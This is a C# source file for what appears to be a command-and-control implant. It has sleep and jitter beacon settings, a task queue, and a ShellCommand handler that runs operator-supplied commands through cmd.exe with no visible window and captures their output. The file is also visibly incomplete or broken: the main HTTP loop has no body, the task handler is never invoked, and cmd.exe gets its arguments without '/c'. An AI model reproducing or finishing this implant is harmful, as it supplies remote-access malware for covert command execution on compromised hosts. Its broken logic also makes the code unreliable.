using Agent;
using Agent.Models;
using Agent.Services;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO.Pipes;
using Agent.ModuleBase;

AgentInformationService agentInformationService = new AgentInformationService();

var taskQueue = new ConcurrentQueue<AgentTask>();
var taskQueueLock = new object();
var messageQueue = new ConcurrentQueue<AgentTask>();
var messageQueueLock = new object();
var commandOutputQueue = new ConcurrentQueue<string>();
var rnd = new Random();
var agentInfo = await agentInformationService.GetAgentInfoAsync();

// Load the embedded config
var baseConfig = ConfigLoader.LoadEmbeddedConfig();

// Initialize baseConfig agentID and other variables
if (agentInfo is not null)
{
    baseConfig.AgentId = agentInfo.AgentId;
}

var delay = baseConfig.Sleep;
var jitter = baseConfig.Jitter;

try
{
    // Main loop
    while (true)
    {
        using (var client = new HttpClient())

        await Task.Delay(baseConfig.Sleep * 1000);
    }
}
catch (Exception ex)
{
    Console.WriteLine($"Agent initialization failed: {ex.Message}");
}


async Task HandleQueuedTasks()
{
    while (taskQueue.TryDequeue(out var task))
        await HandleTask(task);
}

async Task HandleTask(AgentTask task)
{
    task.QueueRunningStatus(messageQueue, messageQueueLock);

    switch (task.Type)
    {
        // When the SetDelay TaskType is set, the 2nd param always needs a value
        // -1 will set Delay only and skip changing jitter
        case AgentTaskType.SetDelay:
            delay = Convert.ToInt32(task.Command.Parameters[1]);
            var jitterParam = Convert.ToInt32(task.Command.Parameters[2]);
            jitter = jitterParam != -1 ? jitterParam : jitter;
            break;
        case AgentTaskType.SetJitter:
            jitter = Convert.ToInt32(task.Command.Parameters[1]);
            break;
        case AgentTaskType.ShellCommand:
            await Task.Run(async () =>
            {
                task.Command.CommandStarted = DateTime.UtcNow;
                task.Command.Output = await ExecuteShellCommand(task.Command.Parameters);
                task.Command.CommandCompleted = DateTime.UtcNow;
            });
            break;
        case AgentTaskType.Exit:
            break;
    }

    task.QueueCompletedStatus(messageQueue, messageQueueLock);
}

// Command execution logic
string ExecuteCommand(ICommand command, string[]? parameters, bool IsCancellationTokenSourceSet)
{
    const int delay = 1;
    const int MAX_MESSAGE_SIZE = 1048576;
    var output = string.Empty;
    var results = string.Empty;
    var invokeThread = new Thread(() => results = command.Execute(parameters));
    using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
    {
        using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))
        {
            command.OutputStream = pipeClient;
            var lastTime = DateTime.Now;
            invokeThread.Start();
            using (StreamReader reader = new StreamReader(pipeServer))
            {
                var synclock = new object();
                var currentRead = string.Empty;
                var readThread = new Thread(() =>
                {
                    int count;
                    var read = new char[MAX_MESSAGE_SIZE];
                    while ((count = reader.Read(read, 0, read.Length)) > 0)
                    {
                        lock (synclock)
                        {
                            currentRead += new string(read, 0, count);
                        }
                    }
                });
                readThread.Start();
                while (readThread.IsAlive)
                {
                    Thread.Sleep(delay * 1000);
                    lock (synclock)
                    {
                        try
                        {
                            if (currentRead.Length >= MAX_MESSAGE_SIZE)
                            {
                                for (int i = 0; i < currentRead.Length; i += MAX_MESSAGE_SIZE)
                                {
                                    string aRead = currentRead.Substring(i, Math.Min(MAX_MESSAGE_SIZE, currentRead.Length - i));
                                    try
                                    {
                                        commandOutputQueue.Enqueue(aRead);
                                    }
                                    catch (Exception) { }
                                }
                                currentRead = string.Empty;
                                lastTime = DateTime.Now;
                            }
                            else if (currentRead.Length > 0 && DateTime.Now > (lastTime.Add(TimeSpan.FromSeconds(delay))))
                            {
                                commandOutputQueue.Enqueue(currentRead);
                                currentRead = string.Empty;
                                lastTime = DateTime.Now;
                            }
                        }
                        catch (ThreadAbortException) { break; }
                        catch (Exception) { currentRead = string.Empty; }
                    }
                }
                output += currentRead;
            }
        }
        invokeThread.Join();
    }
    output += results;

    return output;
}

// If web terminal param is set to "shell" execute with:
async Task<string> ExecuteShellCommand(string[] commandParameters, bool IsCancellationTokenSourceSet = false)
{
    ArgumentNullException.ThrowIfNull(commandParameters, nameof(commandParameters));

    var command = string.Join(" ", commandParameters);
    var output = string.Empty;

    try
    {
        await Task.Run(() =>
        {
            Console.WriteLine(command);
            Console.WriteLine(AppContext.BaseDirectory);

            var processStartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = command,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                UseShellExecute = false,
                WorkingDirectory = AppContext.BaseDirectory
            };

            var process = new Process { StartInfo = processStartInfo };

            Console.WriteLine($"{processStartInfo.FileName} {processStartInfo.Arguments}");

            process.Start();
            output = process.StandardOutput.ReadToEnd(); // Capture the output
            string errorOutput = process.StandardError.ReadToEnd(); // Capture error output
            process.WaitForExit();

            if (!string.IsNullOrEmpty(errorOutput))
            {
                Console.WriteLine("Error Output:");
                Console.WriteLine(errorOutput);
                output = errorOutput;
            }
        });
    }
    catch (Exception ex)
    {
        Console.WriteLine($"Failed to run command: {command}\n\t{ex.Message}");
        throw;
    }

    return output;
}